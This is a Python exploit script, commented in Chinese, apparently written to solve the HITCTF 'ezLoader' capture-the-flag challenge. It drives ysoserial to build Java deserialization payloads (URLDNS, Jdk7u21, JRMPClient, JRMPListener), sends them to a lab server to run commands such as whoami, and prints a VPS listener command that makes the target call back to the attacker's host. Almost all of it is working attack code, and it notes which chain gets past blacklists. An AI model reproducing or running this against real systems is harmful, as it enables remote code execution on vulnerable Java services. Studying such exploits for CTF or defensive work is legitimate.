#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HITCTF - ezLoader 原生 Java 反序列化利用
使用不依赖外部库的利用链
"""

import requests
import base64
import subprocess
import sys
import os

TARGET_URL = "http://5bd9497ae8ad.target.yijinglab.com/unser"


def generate_payload_with_java_options(chain_name, command):
    """
    使用 ysoserial 生成 payload (支持 Java 17+)
    """
    print(f"[*] 正在生成 {chain_name} payload: {command}")
    
    ysoserial_path = "ysoserial.jar"
    if not os.path.exists(ysoserial_path):
        print("[!] 未找到 ysoserial.jar")
        return None
    
    try:
        java_opts = [
            "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
            "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
            "--add-opens=java.base/java.net=ALL-UNNAMED",
            "--add-opens=java.base/java.util=ALL-UNNAMED",
            "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
            "--add-opens=java.rmi/sun.rmi.server=ALL-UNNAMED",
            "--add-opens=java.base/sun.security.x509=ALL-UNNAMED"
        ]
        
        cmd = ["java"] + java_opts + ["-jar", ysoserial_path, chain_name, command]
        
        result = subprocess.run(cmd, capture_output=True, timeout=10)
        
        if result.returncode != 0:
            stderr = result.stderr.decode('utf-8', errors='ignore')
            print(f"[!] 生成失败: {stderr[:200]}")
            return None
            
        payload = result.stdout
        print(f"[+] Payload 生成成功，大小: {len(payload)} 字节")
        return payload
        
    except Exception as e:
        print(f"[!] 生成 payload 时出错: {e}")
        return None


def exploit(payload_bytes, url=TARGET_URL):
    """发送 payload"""
    if not payload_bytes:
        return None
    
    payload_b64 = base64.b64encode(payload_bytes).decode()
    print(f"[*] 发送到: {url}")
    
    try:
        response = requests.post(
            url,
            data={"data": payload_b64},
            timeout=10,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        print(f"[+] 状态码: {response.status_code}")
        print(f"[+] 响应:\n{response.text[:500]}")
        return response
        
    except Exception as e:
        print(f"[!] 请求出错: {e}")
        return None


def main():
    print("=" * 60)
    print("  HITCTF - ezLoader 原生链利用")
    print("  目标服务器无 commons-collections 依赖")
    print("=" * 60)
    print()
    
    print("⚠️  可用的无依赖利用链:")
    print("1. URLDNS - DNS 外带测试 (无回显，用于确认漏洞)")
    print("2. Jdk7u21 - RCE (需要 JDK <= 7u21)")
    print("3. JRMPClient - 反弹 RMI 连接 (配合 ysoserial 服务端)")
    print("4. JRMPListener - 监听 RMI 连接")
    print("5. 自动尝试所有链")
    print()
    
    choice = input("请选择 [1-5]: ").strip()
    
    if choice == "1":
        dnslog = input("请输入 DNSlog 域名 (例: xxx.dnslog.cn): ").strip()
        if not dnslog:
            print("[!] DNSlog 域名不能为空")
            return
        
        print(f"\n[*] 将触发 DNS 查询: {dnslog}")
        print("[!] 请在 DNSlog 平台查看记录")
        
        payload = generate_payload_with_java_options("URLDNS", f"http://{dnslog}")
        if payload:
            exploit(payload)
            
    elif choice == "2":
        command = input("请输入命令 (默认: whoami): ").strip() or "whoami"
        print(f"\n[!] Jdk7u21 链需要目标 JDK <= 7u21")
        print(f"[*] 执行命令: {command}")
        
        payload = generate_payload_with_java_options("Jdk7u21", command)
        if payload:
            exploit(payload)
            
    elif choice == "3":
        vps_ip = input("请输入 VPS IP: ").strip()
        vps_port = input("请输入监听端口 (默认: 1099): ").strip() or "1099"
        
        print(f"\n[!] JRMPClient 需要在 VPS 上运行 ysoserial 服务端:")
        print(f"    java -cp ysoserial.jar ysoserial.exploit.JRMPListener {vps_port} CommonsCollections6 'bash -c ...'")
        print(f"[*] 目标将连接到: {vps_ip}:{vps_port}")
        
        payload = generate_payload_with_java_options("JRMPClient", f"{vps_ip}:{vps_port}")
        if payload:
            exploit(payload)
            
    elif choice == "4":
        port = input("请输入监听端口 (默认: 1099): ").strip() or "1099"
        
        print(f"\n[*] JRMPListener 将在目标服务器 {port} 端口监听")
        print("[!] 然后你需要连接到该端口触发利用")
        
        payload = generate_payload_with_java_options("JRMPListener", port)
        if payload:
            exploit(payload)
    
    elif choice == "5":
        command = input("请输入命令 (默认: whoami): ").strip() or "whoami"
        
        print(f"\n[*] 自动尝试所有可用链...")
        print(f"[*] 命令: {command}")
        print()
        
        # 尝试所有不需要外部依赖的链
        chains = [
            ("Jdk7u21", command),
        ]
        
        for chain_name, cmd in chains:
            print(f"\n[{chain_name}] 正在尝试...")
            payload = generate_payload_with_java_options(chain_name, cmd)
            if payload:
                response = exploit(payload)
                if response and response.status_code == 200:
                    print(f"  ✅ {chain_name} 可能成功!")
                    break
                else:
                    print(f"  ❌ {chain_name} 失败 (状态码: {response.status_code if response else 'N/A'})")
    
    else:
        print("[!] 无效选项")
        return
    
    print("\n" + "=" * 60)
    print("💡 提示:")
    print("  • 如果 URLDNS 收到 DNS 请求，说明反序列化漏洞存在")
    print("  • 500 错误可能意味着 payload 不兼容或触发异常")
    print("  • JRMPClient 是通用方法，绕过大多数黑名单")
    print("  • 题目可能需要特定 JDK 版本的原生链")
    print("=" * 60)


if __name__ == "__main__":
    main()
